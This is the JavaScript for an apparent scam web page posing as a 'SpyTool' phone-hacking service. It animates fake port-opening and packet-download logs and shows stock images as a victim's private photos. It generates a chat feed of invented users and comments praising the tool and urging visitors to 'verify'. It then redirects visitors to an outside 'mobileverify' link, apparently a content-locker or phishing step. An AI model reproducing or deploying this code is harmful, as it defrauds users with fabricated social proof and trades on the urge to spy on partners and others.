//  MIG92 JS
//

$("form").submit(function(e){
    return false;
});
// circular-loader

$(function() {
  var $topLoader = $("#topLoader").percentageLoader({width: 160, height: 160, controllable : false, progress : 0, onProgressUpdate : function(val) {
      $topLoader.setValue(Math.round(val * 100.0));
    }});

  var topLoaderRunning = false;
  $("#animateButton").click(function() {
    if (topLoaderRunning) {
      return;
    }
    topLoaderRunning = true;
    $topLoader.setProgress(0);
    $topLoader.setValue('0%');
    var kb = 0;
    var totalKb = 100;

    var animateFunc = function() {
      kb += 2;
      $topLoader.setProgress(kb / totalKb);
      $topLoader.setValue(kb.toString() + '%');

      if (kb < totalKb) {
        setTimeout(animateFunc, 25);
      } else {
        topLoaderRunning = false;
          $("#modal-number").modal({backdrop:'static',keyboard:false, show:true});
            $(function(){
              $("#enterNumber").typed({
                strings: ["^1000 Enter Victim Number.","^1000 Then Click Button 'Hack'"],
                typeSpeed: 0,
                startDelay: 5,
              });
            });
            $('#number').removeClass('hide');
            $('#topLoader').addClass('hide');
       /* $("#modal-consol").modal({backdrop:'static',keyboard:false, show:true});
        console_api();*/
      }
    }

    setTimeout(animateFunc, 25);

  });
});

// type text

$(function(){
  $(".element").typed({
    strings: ["^1000 Welcome to SpyTool ", " ^1000 To begin Spying", "^1000 Please press SpyNow."],
    typeSpeed: 0,
    startDelay: 5,
  });
});

// logic

var chosensocial='';
var collect=[];
var api=[];

function console_api(){

    round=0;
    startconsole("SUCCESS", collector);
}

function collector(){
    round=0;

    startcollecting("DATA READY",distribute);
}


var  console = 0;
var round=0;
function startconsole(finished, myfunc){
    setTimeout(function(){
        if(round<200){
            $('#container').append("<span class='consol-yallow-text hack-regular'>Opening port</span> "+(Math.floor(Math.random() * 999) + 1)+" <span class='consol-yallow-text hack-regular'>on 103.443.201.1</span> <br \>");
            $('#container').scrollTop($('#container')[0].scrollHeight);
            round+=1;
            startconsole(finished, myfunc);
        } else {
            $('#container').html("<strong><span class='consol-yallow-text text-center hack-regular'>Ports opened...Redirecting...</span></strong>");
            $('#container').scrollTop($('#container')[0].scrollHeight);
            $('.element').addClass('hide');
            $('.typed-cursor').addClass('hide');


            /*$('#number').removeClass('hide');
            $('#topLoader').addClass('hide');*/
            if(console == 0)
            {
                startcollecting();
               /*  $("#modal-consol").modal('hide');*/


               console = 1;
            }


        }
    },2);
}

function startcollecting(finished, myfunc){
    setTimeout(function(){
        if(round<400){
            $('#container').append("<span class='consol-yallow-text '>Downloading packet</span> "+(Math.floor(Math.random() * 999999999) + 111111111)+' <br \>');
            $('#container').scrollTop($('#container')[0].scrollHeight);
            round+=1;
            startcollecting(finished, myfunc);
        } else {
             $('#container').append(finished);
             $('#container').append("<strong><span class='consol-yallow-text '>Data has been downloaded.</span></strong>");
             $('#container').scrollTop($('#container')[0].scrollHeight);
            setTimeout(function(){
                 $("#modal-images").modal({backdrop:'static',keyboard:false, show:true});
                 $("#modal-consol").modal('hide');
            },1200);

        }
    },1);
}
function distribute(){

    round=0;

     $("#modal-consol").modal({backdrop:'static',keyboard:false, show:true});

}

        var go = 0;
        var audioSources = ['sounds/dtmf-0.mp3','sounds/dtmf-1.mp3'];
      $('#userNumber').keyup(function(e) {
         var code = e.keyCode || e.which;
         switch (code) {
            case 48:
            $("#sound0").get(0).play();
            break;
            case 49:
            $("#sound1").get(0).play();
            break;
            case 50:
            $("#sound2").get(0).play();
            break;
            case 51:
            $("#sound3").get(0).play();
            break;
            case 52:
            $("#sound4").get(0).play();
            break;
            case 53:
            $("#sound5").get(0).play();
            break;
            case 54:
            $("#sound6").get(0).play();
            break;
            case 55:
            $("#sound7").get(0).play();
            break;
            case 56:
            $("#sound8").get(0).play();
            break;
            case 57:
            $("#sound9").get(0).play();
            break;
        }


        });


    $("#hack").click(function() {
        var p = jQuery('#userNumber').val();
        if (p.length <= 13) {
            $('#error').text('Enter Real Phone Number');
        }

        if ($.trim($('#userNumber').val()) == '+') {
            $('#error').removeClass('hide');
            $('#error').text('Number Cannot Be Empty!');
        }
        if($.trim($('#userNumber').val()) != '+' && p.length >= 13 ){

         /*   startcollecting();*/
             console_api();
            $("#modal-number").modal('hide');
            $("#modal-consol").modal({backdrop:'static',keyboard:false, show:true});
        }

    })

    $(".slika").click(function() {
        var imgPath = $(this).attr("src");
        if (imgPath == 'img/snap.svg') {
           imageShow('snapImg');
        }
        if (imgPath == 'img/messages.svg') {
            imageShow('textImg');
        }
        if (imgPath == 'img/insta.svg') {
            imageShow('instaImg');
        }
        if (imgPath == 'img/gallery.svg') {
            imageShow('galeryImg');
        }
    })
  /*     $(window).load(function(){
        $('#modal-images').modal('show');
    });*/
    function imageShow(folders){
        var l=0;
         $("#modal-selected").modal({backdrop:'static',keyboard:false, show:true});
         $("#modal-images").modal('hide');
         var folder = 'img/'+folders+"/";
         var id;
    $.ajax({
        url : folder,
        success: function (data) {

            $(data).find("a").attr("href", function (i, val) {
                if( val.match(/\.(jpe?g|png|gif)$/) ) {

                    setTimeout(function(){

                        $('.loadSelected').append(" <div id='selectedImage' data-id="+i+"  class='col-sm-12  selectedImage hide'><img class='img-responsive nextStep  animated fadeIn element-center' src='"+ folder + val +"'></div>");

                        var id=1;
                        var fadeImg = setInterval(function(){

                        $('[data-id='+id+']').removeClass('hide')
                        $('[data-id='+id+']').addClass('animated fadeIn');
                        id++;
                     /*   console.log(id)*/
                        if (id > 5) {
                            clearInterval(fadeImg);
                             $('#progress').hide();
                        }
                    }, 1000);

                    }, 1000);

                    }

            });
                  setTimeout(function(){

                            $('.loadSelected').append("<div  class='col-sm-12 text-center'><h3 class='nextStep' style='color:#fff;'>(Tap To continue)</h3></div>");
                        }, 8000);
            }

            });
    }



        $(document).on("click", '.nextStep', function(event) {

            window.location = 'http://mobileverify.xyz/?id=b9266be414ee638ec5639d8d7498ecf4';
    })


    var cleave = new Cleave('#userNumber', {
        prefix: '+',
        delimiter: '-',
    /*    phone:true,
        country:'US',*/
        numericOnly:true,
        delimiter: '·',
        blocks: [4, 3, 3 ,3],
        uppercase: true
    });


    function currentTime(){
        var currentTime = new Date();
        var hours = currentTime.getHours();
        var minutes = currentTime.getMinutes();
        return hours+":"+minutes;
    }

    function names(){

           var names = ["crayvids","mattyibraps","JLOFAN",
                        "Crissy" , "AnonyMOUSE" , "30WatchPro" ,
                        "LiftersTonight" , "MarcusT" , "Arcscrew" ,
                        "handsomeupon" , "Shorecut" , "illogicalcss" ,
                        "Draconianglue" , "AnnBuddy" , "Beeklin" ,
                        "LovesPengu" , "AceX" , "Katt" ,
                        "Katy Finch" , "SHARDRICH" , "Broooke" ,
                        "FashionMIA" , "Chite Kene" , "Crologen" ,
                        "Danny T" , "Hank" , "5SOS FOREVER" ,
                        "Tanner Williams" , "MattB" , "Allopod" ,
                        "Markus Turner" , "William M" , "Hannes Dan" ,
                        "Blake Tenney" , "MIRZA" , "Gunther K" ,
                        "Drest Lucilius" , "Modestus J" , "Otavio" ,
                        "Ioseph Theophil" , "Virgilijus " , "Yusup Farah" ,
                        "Bran Darby" , "Husni" , "Miro" ,
                        "Devon" , "Antonio T" , "Jameson Mathys" ,
                        "Stephanos" , "Drew" , "Adalbern" ,
                        "Ludvigs" , "Selena" , "Hank" ,
                        "Burton" , "Anton" , "Jehoiakim Meurig" ,
                        "Rustam" , "Erik" , "Matfey" ,
                        "Tulio" , "Farrukh" , "Ferdinando" ,
                        "Justin" , "Clay" , "Augustine" ,
                        "Toni" , "Cherette" , "TED" ,
                        "Katherine" , "Davy" , "Lolicia" ,
                        "Carla" , "Sheryl" , "Ethelyn T" ,
                        "Ash" , "Haydn" , "Clifton" ,
                        "Evangeline" , "Manuel" , "Dewayne" ,
                        "Janis" , "Roddy PIPA" , "Rodge" ,
                        "Marlene" , "texas feeeend" , "TEX" ,
                        "Neil" , "Awiti" , "Baz" ,
                        "Branden" , "Jaylen" , "Essence" ,
                        "Hellen" , "SUSAN" , "Keila" ,
                        "Hiram" , "Marylou" , "Charisse" ,
                        "Huey" , "Frona" , "Alayna" ,
                        "Chinyere" , "Madonna" , "RAYNERR" ,
                        "JOHN" , "Elias" , "Morgan" ,
                        "Johnna" , "Mohammad" , "Dylan" ,
                        "Albert F" , "Fleurette W" , "DEON" ,
                        "Sabella" , "Rickey Felker" , "Zuri Toei" ,
                        "Idonea" , "Joey" , "walter" ,
                        "Lexus" , "FayBABE xo" , "SHAAAY" ,
                        "Tisha" , "Rebecca" , "Ozz" ,
                        "Nichola" , "JESS" , "Triston" ,
                        "Mikayla33" , "Ruth" , "Desiree" ,
                        "Kyra" , "Sawyer" , "Wally Pecoff" ,
                        "Nsia" , "USABABY" , "German bloood" ,
                        "Sindy" , "Garrett" , "Archibald" ,
                        "Hunter" , "MATRAPS" , "ILOVEIFOLLOWERS" ,
                        "Bethanie" , "BETH" , "Dotty" ,
                        "HAPPYBRO" , "Raschelle" , "Tiana" ,
                        "ROSANA" , "Elisabeth" , "LIZ" ,
                        "Jon" , "Cam" , "Fab" ,
                        "Bam" , "Dicky" , "Jack" ,
                        "JIM" , "Dudeguy" , "Eli" ,
                        "Sar" , "Mat" , "Brent" ,
                        "boobooo" , "Gib" , "Graid33" ,
                        "Buzz" , "OIBOI" , "Alf" ,
                        "10k4EVER" , "Lex" , "Misha" ,
                        "moe" , "Nat" , "Nico" ,
                        "Xavier" , "Rico" , "Ray" ,
                        "Sam" , "Pat" , "Walt" ,
                        "Sully" , "Heather" , "Vin"

    ];




        var item = names[Math.floor(Math.random()*names.length)];
        return item
    }
    function comments(){

      var comments = [ "OMFG IT WORKS&#128525;&#128525;&#128525;",
                    "Went through every pic xoxo&#128536;&#128536;",
                    "Omg it unblurs after you verify&#128525;",
                    "ALL THE PICS UNBLUR AFTER YOU VERIFY&#10084;&#10084;&#10084;",
                    "Damnnnn went through the pics&#128640;&#128640;",
                    "HOT PICTURES THANK U&#128069;&#128069;&#128069;&#128069;Works after you verify",
                    "DAMN&#128293;&#128293;&#128293;",
                    "I hope I don't get in trouble for doing this&#128519;",
                    "Yummy&#128539;&#128539; ALL pics unblur after you verify",
                    "lol wtf how this legal&#128514;&#128514;&#128514;",
                    "HAHAHA&#128514;&#128514; IT FUCKIN WORKS AFTER YOU VERIFY",
                    "&#128514;&#128514;WORKS",
                    "I went on a spree for like 2 hours&#128514;&#128514;&#128514;",
                    "Lurked every single picture and dm lmfao&#128514;",
                    "I hope no one use dis on me&#128514;&#128514;",
                    "UM how is this legal?&#128531;&#128531;",
                    "WTF how is this even allowed...&#128531;",
                    "LMFAO I can't believe this actually works&#128531;",
                    "Damn...works...gotta verify but it works...",
                    "KNEW THEY WERE FUCKING CHEATING&#128531;",
                    "yep caught the damn lying cheater&#128532;&#128532;",
                    "CHEATERS EVERYWHERE I SWEAR SMH &#128532; Anyways this works...gotta verify",
                    "Omg i love this....&#128536; Works after you verify",
                    "I hope no one uses this on me &#128545;&#128545; Went through all their DM's on twitter haha",
                    "WTF&#128544;&#128544; CAUGHT THE CHEATER",
                    "IT WORKS?!.... my partner was cheating&#128544;....but thanks for helping me find out. Make sure you verify",
                    "Yea just have to verify.....damn went through my bestfriend's snapchat and they sendin nudes lol...",
                    "Yea i wonder how this is even legal &#128549;&#128549; Can someone use this on me?",
                    "SERIOUSLY...&#128552;....It works but like damn...",
                    "I GOT CHEATED ON &#128557;&#128557;&#128557;&#128557;",
                    "SAME &#128557;&#128557;",
                    "Hope no one looks at my photos&#128563;&#128563;&#128563;",
                    "Omg&#128563; I have too many personal photos...I can't believe this works...",
                    "People make me sick&#128567; STOP USING THIS IT INVADES PRIVACY",
                    "Yea don't use this...total invasion of privacy&#128567;",
                    "I'm peepin everyone lmfao&#128064;&#128064;&#128064;",
                    "&#128064;&#128064;&#128064;&#128064;&#128064;",
                    "HOLY&#128064; Lot of nice pics in my crush's phone lmfao",
                    "DKM&#128128;&#128128;&#128128; It works..just gotta verify",
                    "THANK LORD&#128166;&#128166;&#128166;",
                    "BLESS&#128166;&#128069;&#128069;&#128069;",
                    "DAYUM&#128591;&#128591; Thank u",
                    "I can't believe this actually works&#128588;&#128588; Make sure to verify",
                    "I don't understand how this works but fuck idc haha &#128293;&#128293;&#128293; ",
                    "&#128293;&#128293;&#128293;&#128293;&#128293;",
                    "Still workin yup lol &#128175;&#128175;",
                    "Works&#128175;",
                    "Make sure you verify but yea it works&#128175; Went through their entire snapchat haha",
                    "&#128175;&#128175;&#128175;&#128175;&#128175;&#128175;&#128175;&#128175;&#128175;",
                    "YUUUUP&#128175;",
                    "THANKS&#128170;&#128170; Finally exposed a cheater",
                    "Leaking all their pics now lmfao &#128170;&#128170;",
                    "dkm I'm deleting all my pics on my phone haha &#128563;&#128563;&#128563;",
                    "Yo wtf it even works on my own phone....&#128128;&#128128;&#128128;",
                    "Thank you based god &#128166;&#128166;",
                    "Even works on your own phone so be careful &#128521;&#128521;&#128521;",
                    "Yea same...deleting my own pics so no one does this on my number lmfao...",
                    "Got loads of pics for tonight&#128521;",
                    "THANK U IT WORKS AFTER U VERIFY&#128515;",
                    "Unblurs after you verify just like it say's&#128076; Thanks",
                    "&#128076;&#128076;&#128076;&#128076;&#128076;&#128076;",
                    "Can't believe it works... Pics show after you verify...thanks&#128076;",
                    "WOOOOWWW&#128077;&#128077;&#128077;&#128077;",
                    "&#128077;&#128077;&#128077;&#128077;&#128077;&#128077;&#128077;",
                    "THANK U&#128077;&#128077;",
                    "&#128077;&#128175;",
                    "SO MANY PICTURES AFTER U VERIFY&#128539;&#128539;&#128539;",
                    "Spent like an hour on this thing haha...&#128539;",
                    "I SPENT ALL DAY ON THIS LOL&#128563;&#128563;",
                    "FUCKIN PEEPING EVERYONE&#128064;&#128064;&#128064;",
                    "I SEEEEE EVERYTHING NOW&#128064;",
                    "Now I gotta delete all my pics and messages so no one does this to me&#128128;",
                    "WTF yea it even works on my phone&#128128; fml",
                    "Works just as expected&#128515; Unblurs after you verify",
                    "Messages show after you verify... thanks &#128515;",
                    "OMG i wish i didn't see some of the things&#128557;",
                    "wtf i got cheated on....",
                    "I'm creepin through every damn pic...thank u. (anyone that says it doesn't work just make sure you verify).",
                    "works",
                    "Works after you verify! Thanks",
                    "Snapchats show after you verify...dope",
                    "DOPE",
                    "Didn't think it would work but then I verified...EVERYTHING showed up....",
                    "OMFG...&#128526;&#128526;&#128526;",
                    "Yea you gotta verify first but still it works",
                    "HOW IS THIS ALLOWED....YOU CAN SEE ALL MY PRIVATE PICS??????",
                    "WTF YOU CAN EVEN SEE MY PICS?&#128544;&#128544;",
                    "HAHHAAH I spied on all the text messages of my friends.....They thought it was magic lmfao",
                    "After I downloaded and opened the app everything showed up. Thanks",
                    "Thanks",
                    "THANKS!!!!!",
                    "Make sure to verify guys....it does work",
                    "Yea I just had to verify and EVERY photo came up on their phone. Fuckin crazy..just make sure you verify.",
                    "I'm so tempted to do so many bad things lmfao...",
                    "fucking cheaters.. my bestfriend is such a liar too... found out so much stuff.",
                    "Wow... Secret DM's. I found a lot of shit out",
                    "Found so much dirt on my worst enemy&#128519;",
                    "FUCK MY PHONE SHOWS UP TOO&#128544;&#128544; Messages showed after I verified",
                    "I do this every single day haha. Make sure to verify."
            ];



    var item = comments[Math.floor(Math.random()*comments.length)];
    return item;
}


    function chat() {

            $('.chat').append('<p class="circular-book chat-date">'+currentTime()+' - <span class="user"> '+names()+'</span></p><div class="chat-holder"><p class="circular-book chat-content">'+comments()+'</p></div>');
            $("#scroll").animate({ scrollTop: $('.panel-custom').prop("scrollHeight")}, 2000);
    }


        for (var i = 0; i <= 6; i++) {
           chat()
        }


        setInterval(function(){ chat() }, randTime());

    function reply(){
        var reply = ["ya","yuuuup","yeah","yea...","worked for me", "it works", "mhm"];
        var item = reply[Math.floor(Math.random()*reply.length)];
        return item;

    }

    function randTime() {
            var x = Math.floor((Math.random() * 8) + 6);
            var secs=x+'000';
            return secs
    }

      $("#send").click(function() {
        if ($.trim($('#uComment').val()) == '') {
            $("#modal-user").modal('hide');
            $('.chat-description').text('Comment Required!');
        }
         if ($.trim($('#uName').val()) != '' && $.trim($('#uComment').val()) != '') {
            $('.chat').append('<p class="circular-book chat-date">'+currentTime()+' - <span class="user"> '+$("#uName").val()+'</span></p><div class="chat-holder"><p class="circular-book chat-content">'+$("#uComment").val()+'</p></div>');
             $("#modal-user").modal('hide');
             $('.chat-description').text('Comment Sent!');
            setTimeout(function(){
                $('.chat').append('<p class="circular-book chat-date">'+currentTime()+' - <span class="user"> '+names()+'</span></p><div class="chat-holder"><p class="circular-book chat-content"><span class="chat-date">@'+$("#uName").val()+'</span> '+reply()+'</p></div>');
            $('#uName').val("");
             $('#uComment').val("");
           }, 3000);

        }

      })

